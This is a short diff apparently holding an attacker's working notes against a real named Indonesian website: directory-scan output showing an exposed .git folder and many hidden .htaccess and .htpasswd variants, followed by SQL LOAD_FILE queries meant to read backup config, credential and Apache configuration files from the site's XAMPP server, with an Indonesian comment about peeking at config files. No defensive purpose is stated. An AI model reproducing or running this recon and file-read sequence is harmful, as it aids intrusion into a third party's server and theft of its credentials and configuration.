@@ -1,1 +1,28 @@
+==
+.env                
+.git/logs/           (Status: 301) [Size: 372] [--> https://www.shoetowngroup.co.id/Web_Sci/.git/logs]
+.gitattributes       (Status: 200) [Size: 186]
+.gitignore           (Status: 200) [Size: 221]
+.hta.rar             (Status: 403) [Size: 314]
+.hta.old             (Status: 403) [Size: 314]
+.htaccess.env.backup (Status: 403) [Size: 314]
+.htaccess.bak        (Status: 403) [Size: 314]
+.htaccess.old        (Status: 403) [Size: 314]
+.htpasswd            (Status: 403) [Size: 314]
+.htaccess.txt        (Status: 403) [Size: 314]
+.htaccess.log        (Status: 403) [Size: 314]
+.htpasswd.env        (Status: 403) [Size: 314]
+.htpasswd.old        (Status: 403) [Size: 314]
+.htpasswd.zip        (Status: 403) [Size: 314]
+.htpasswd.txt        (Status: 403) [Size: 314]
+.htpasswd.env.backup (Status: 403) [Size: 314]
+
+
+
+
 SELECT LOAD_FILE('D:/xampp/htdocs/Web_Sci/.htaccess.env.backup');
+
+
+SELECT LOAD_FILE('D:/xampp/mysql/data/backup_config.txt');
+-- atau mengintip file konfigurasi web bawaan XAMPP:
+SELECT LOAD_FILE('D:/xampp/apache/conf/httpd.conf');
